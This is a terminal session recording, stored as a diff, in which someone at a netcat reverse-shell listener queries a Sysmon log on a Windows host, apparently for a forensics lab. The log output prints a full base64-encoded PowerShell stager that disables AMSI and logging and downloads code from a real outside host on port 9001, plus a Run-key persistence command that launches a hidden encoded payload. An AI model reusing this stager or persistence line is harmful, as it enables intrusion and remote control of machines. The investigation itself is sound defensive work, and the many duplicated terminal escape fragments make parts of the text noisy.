@@ -1,0 +1,390 @@
+Script started on 2025-05-03 13:55:11+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 9146
+[KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Desktop>[KC:\Users\Administrator\Desktop>[K[?2004hC:\Users\Administrator\Desktop>powershell[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpowershell
+[Kpowershell
+[KWindows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.[KCopyright (C) Microsoft Corporation. All rights reserved.[KCopyright (C) Microsoft Corporation. All rights reserved.
+
+[KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> [7mGet-WinEvent -Path \.sysmon.evtx -FilterXPath '*/System/EventID=1' | [27m[7mW[27m[7mhere-Object {$_.Message -like "*enc*"} | fl[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path \.sysmon.evtx -FilterXPath '*/System/EventID=1' | Where-Object {$_.Message -like "*enc*"} | fl
+[KG[KG[KGet-WinEvent -Path \.sysmon.evtx -FilterXPath '*/System/EventID=1' | Where-Object {$_.Message -like "*enc*"} | fl
+Get-WinEvent : Cannot find path 'C:\.sysmon.evtx' because it does not exist.
+At line:1 char:1
++ Get-WinEvent -Path \.sysmon.evtx -FilterXPath '*/System/EventID=1' |  ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (\.sysmon.evtx:String) [Get-WinEvent], ItemNotFoundException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.GetWinEventCommand
+ 
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> Get-WinEvent -Path \.sysmon.evtx -FilterXPath '*/System/EventID=1' | Where-Object {$_.Message -like "*enc*"} | fl[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\sysmon.evtx -FilterXPath '*/System/EventID=1' | [1@W[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.\sysmon.evtx -FilterXPath '*/System/EventID=1' | W[1P[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=1' | Where-Object {$_.Message -like "*enc*"} | fl
+[KG[KG[KGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=1' | Where-Object {$_.Message -like "*enc*"} | fl
+[K
+[K
+TimeCreated  : 1/21/2021 5:05:45 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: technique_id=T1059.001,technique_name=PowerShell
+               UtcTime: 2021-01-22 01:05:45.938
+               ProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               ProcessId: 3088
+               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+               Description: Windows PowerShell
+               Product: Microsoftr Windowsr Operating System
+               Company: Microsoft Corporation
+               OriginalFileName: PowerShell.EXE
+               CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJAB
+               QAFMAVgBFAHIAUwBJAE8ATgBUAEEAQgBsAEUALgBQAFMAVgBFAHIAcwBJAG8ATgAuAE0AQQBKAE8AcgAgAC0ARwBFACAAMwApAHsAJAB
+               mAGYAZgA2AD0AWwByAGUAZgBdAC4AQQBTAHMAZQBtAEIATAB5AC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgB
+               hAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAA
+               nAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbAB
+               pAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGYAZgBGADYAKQB7ACQAQgA5AEIARQA9ACQAZgBGAGYANgAuAEcARQBUAFYAYQB
+               sAFUAZQAoACQATgBVAEwATAApADsASQBmACgAJABCADkAYgBFAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwB
+               pAG4AZwAnAF0AKQB7ACQAQgA5AEIAZQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwB
+               FAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABiADkAQgBlAFsAJwB
+               TAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbAB
+               vAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMATwBMAGwARQBDAHQAaQB
+               PAG4AUwAuAEcARQBuAEUAcgBJAGMALgBEAEkAYwBUAEkAbwBOAEEAUgB5AFsAUwBUAHIAaQBuAEcALABTAHkAUwB0AEUATQAuAE8AQgB
+               qAGUAYwBUAF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwA
+               nAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdAB
+               CAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAOQBiAEUAWwAnAEgASwBFAFkAXwB
+               MAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwB
+               mAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwB
+               nAGkAbgBnACcAXQA9ACQAVgBBAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAVABCAGwAbwBjAGsAXQAuACIARwBlAFQARgBpAGUAYAB
+               sAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA
+               uAFMARQBUAFYAYQBMAHUAZQAoACQAbgBVAEwAbAAsACgATgBlAHcALQBPAEIAagBFAEMAdAAgAEMATwBMAGwAZQBjAHQASQBvAE4AcwA
+               uAEcARQBuAGUAcgBJAEMALgBIAGEAUwBIAFMAZQBUAFsAcwBUAHIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQB
+               TAFMARQBtAGIAbAB5AC4ARwBlAFQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwB
+               tAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAdABGAEkARQBMAEQAKAAnAGEAbQB
+               zAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB
+               0AFYAYQBMAFUARQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApADsAfQA7AFsAUwB5AHMAdABFAG0ALgBOAEUAVAAuAFMARQByAFYASQB
+               DAEUAUABvAEkAbgB0AE0AQQBuAEEAZwBlAFIAXQA6ADoARQB4AFAARQBjAFQAMQAwADAAQwBPAG4AVABJAG4AdQBlAD0AMAA7ACQAMgA
+               3AEMARQA9AE4AZQBXAC0ATwBCAEoARQBjAHQAIABTAFkAcwBUAEUAbQAuAE4ARQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQA
+               nAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgB
+               pAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKAB
+               bAFQARQB4AHQALgBFAE4AQwBvAEQAaQBOAGcAXQA6ADoAVQBOAGkAQwBvAEQAZQAuAEcARQBUAFMAdAByAGkAbgBnACgAWwBDAE8AbgB
+               WAGUAUgB0AF0AOgA6AEYAcgBPAE0AQgBBAHMARQA2ADQAUwBUAHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA
+               4AEEATAB3AEEAegBBAEQAUQBBAEwAZwBBAHkAQQBEAFEAQQBOAFEAQQB1AEEARABFAEEATQBnAEEANABBAEMANABBAE0AUQBBADIAQQB
+               EAEUAQQBPAGcAQQA1AEEARABBAEEATQBBAEEAeABBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgB
+               wAGgAcAAnADsAJAAyADcAQwBFAC4ASABlAGEAZABFAHIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA
+               7ACQAMgA3AEMAZQAuAFAAcgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcARQBCAFIARQBxAFUAZQBzAFQAXQA6ADoARAB
+               lAGYAQQBVAGwAdABXAEUAQgBQAFIATwBYAFkAOwAkADIANwBjAGUALgBQAFIATwBYAHkALgBDAHIARQBEAEUATgBUAEkAYQBsAHMAIAA
+               9ACAAWwBTAHkAUwB0AGUAbQAuAE4ARQB0AC4AQwBSAEUAZABFAG4AVABpAEEAbABDAEEAQwBoAEUAXQA6ADoARABFAEYAQQBVAEwAVAB
+               OAGUAVAB3AG8AUgBLAEMAcgBFAGQAZQBuAFQAaQBBAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAAyADcAYwB
+               lAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AEUAbQAuAFQAZQBYAFQALgBFAG4AQwBvAEQAaQBOAGcAXQA6ADoAQQBTAEMASQB
+               JAC4ARwBlAFQAQgBZAFQAZQBzACgAJwBhAHcAWABVAEQAawBpAHQAPABvAFYAOQBKAGMAUgBPAEwAewAlAGcAUQAuAHwAMwBuAEgAcQB
+               NAHAAQQAvAGwAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA
+               1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwA
+               kAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJAB
+               JACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJAB
+               IAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJAB
+               IAF0AKQAlADIANQA2AF0AfQB9ADsAJAAyADcAQwBFAC4ASABlAGEARABlAHIAcwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB
+               SAGoATQBlAGUAawA9AFoAbQBRAEwASABhAGMATQBCAFgAcgBMAGMAQgArAFYARQBsAHYATABjAHcATwAyADYARQBZAD0AIgApADsAJAB
+               EAGEAdABBAD0AJAAyADcAQwBlAC4ARABPAHcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAFMAZQByACsAJABUACkAOwAkAGkAdgA9ACQARAB
+               hAFQAQQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAGcAdABoAF0AOwA[K[A[K               hAFQAQQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAGcAdABoAF0AOwA[K[A[K               hAFQAQQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAGcAdABoAF0AOwA
+               tAGoATwBJAE4AWwBDAEgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+               CurrentDirectory: C:\Users\Administrator\
+               User: WIN-Q5JJRDM876J\Administrator
+               LogonGuid: {786593ca-776c-6009-5ea8-030000000000}
+               LogonId: 0x3A85E
+               TerminalSessionId: 1
+               IntegrityLevel: High
+               Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6
+               E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
+               ParentProcessGuid: {786593ca-24a3-600a-e400-000000000300}
+               ParentProcessId: 3624
+               ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+
+
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[K[?2004hPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [7mGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=3' -O[27m[7ml[27m[7mdest -MaxEvent 1 | fl[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=3' -Oldest -MaxEvent 1 | fl
+[KG[KG[KGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=3' -Oldest -MaxEvent 1 | fl
+
+
+TimeCreated  : 1/21/2021 5:05:50 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: technique_id=T1059.001,technique_name=PowerShell
+               UtcTime: 2021-01-21 19:52:53.946
+               ProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               ProcessId: 3088
+               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               User: WIN-Q5JJRDM876J\Administrator
+               Protocol: tcp
+               Initiated: true
+               SourceIsIpv6: false
+               SourceIp: 192.168.10.146
+               SourceHostname: -
+               SourcePort: 49736
+               SourcePortName: -
+               DestinationIsIpv6: false
+               DestinationIp: 34.245.128.161
+               DestinationHostname: -
+               DestinationPort: 9001
+               DestinationPortName: -
+
+
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> nslookup [7m34.245.128.161[27m[7mnslookup [27m34.245.128.161[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnslookup 34.245.128.161
+[Kn[Kn[Knslookup 34.245.128.161
+Server:  ip-10-0-0-2.eu-west-1.compute.internal
+Address:  10.0.0.2
+
+Name:    ec2-34-245-128-161.eu-west-1.compute.amazonaws.com
+Address:  34.245.128.161
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> [7mGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/EventData/Data[@Name[27m[7m=[27m[7m"DestinationIp"] = "34.245.128.161"' | fl[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/EventData/Data[@Name="DestinationIp"] = "34.245.128.161"' | fl
+[KGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/EventData/Data[@Name="DestinationIp"] = "34.245.128.161"' | fl
+
+
+TimeCreated  : 1/21/2021 5:07:10 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: technique_id=T1043,technique_name=Commonly Used Port
+               UtcTime: 2021-01-21 19:54:13.834
+               ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               ProcessId: 2684
+               Image: C:\Windows\explorer.exe
+               User: WIN-Q5JJRDM876J\Administrator
+               Protocol: tcp
+               Initiated: true
+               SourceIsIpv6: false
+               SourceIp: 192.168.10.146
+               SourceHostname: -
+               SourcePort: 49737
+               SourcePortName: -
+               DestinationIsIpv6: false
+               DestinationIp: 34.245.128.161
+               DestinationHostname: -
+               DestinationPort: 9001
+               DestinationPortName: -
+
+TimeCreated  : 1/21/2021 5:05:50 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: technique_id=T1059.001,technique_name=PowerShell
+               UtcTime: 2021-01-21 19:52:53.946[K               UtcTime: 2021-01-21 19:52:53.946[K               UtcTime: 2021-01-21 19:52:53.946
+               ProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               ProcessId: 3088
+               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               User: WIN-Q5JJRDM876J\Administrator
+               Protocol: tcp
+               Initiated: true
+               SourceIsIpv6: false
+               SourceIp: 192.168.10.146
+               SourceHostname: -
+               SourcePort: 49736
+               SourcePortName: -
+               DestinationIsIpv6: false
+               DestinationIp: 34.245.128.161
+               DestinationHostname: -
+               DestinationPort: 9001
+               DestinationPortName: -
+
+
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> [7mGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=13' |[27m[7m [27m[7mWhere-Object {$_.Message -like "*enc*"} | fl[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=13' | Where-Object {$_.Message -like "*enc*"} | fl
+[KG[KG[KGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=13' | Where-Object {$_.Message -like "*enc*"} | fl
+[K
+[K
+TimeCreated  : 1/21/2021 5:08:13 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
+               EventType: SetValue
+               UtcTime: 2021-01-22 01:08:13.468
+               ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               ProcessId: 2684
+               Image: C:\Windows\Explorer.EXE
+               TargetObject: 
+               HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+               Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp 
+               HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
+
+
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [Ket-Dat[?2004hPS C:\Users\Administrator\Desktop> [7m$stTime = Get-Date -Date "1/21/2021 5:05:45 PM"[27m
+[7m$enTime = Get-Date -Date "1/21/2021 5:08:13 PM"[27m
+[7mGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/*' | Where-Object {$_.TimeCreated -ge $stTime -a[27m[7mn[27m[7md $_.TimeCreated -le $enTime}[27m[A[A[A[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h$stTime = Get-Date -Date "1/21/2021 5:05:45 PM"
+$enTime = Get-Date -Date "1/21/2021 5:08:13 PM"
+Get-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/*' | Where-Object {$_.TimeCreated -ge $stTime -and $_.TimeCreated -le $enTime}
+[K$[K$[K$stTime = Get-Date -Date "1/21/2021 5:05:45 PM"
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> $enTime = Get-Date -Date "1/21/2021 5:08:13 PM"
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/*' | Where-Object {$_.TimeCreated -ge $stTime -and $_.TimeCreated -le $enTime}
+[K
+
+   ProviderName: Microsoft-Windows-Sysmon
+
+TimeCreated                     Id LevelDisplayName Message                                                            
+-----------                     -- ---------------- -------                                                            
+1/21/2021 5:08:12 PM             1 Information      Process Create:...                                                 
+1/21/2021 5:08:12 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:12 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...                                             
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   [K[A[K1/21/2021 5:08:11 PM            11 Information      File created:...                                                   [K[A[K1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:11 PM            11 Information      File created:...                                                   
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...                               [K[A[K1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...                               [K[A[K1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:07:40 PM             7 Information      Image loaded:...                                                   
+1/21/2021 5:07:10 PM             3 Information      Network connection detected:...                                    
+1/21/2021 5:07:09 PM             7 Information      Image loaded:...                                                   
+1/21/2021 5:07:06 PM            23 Information      File Delete:...                                                    
+1/21/2021 5:07:06 PM            11 Information      File created:...                                                   
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    [K[A[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    [K[A[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    [K[A[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    [K[A[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
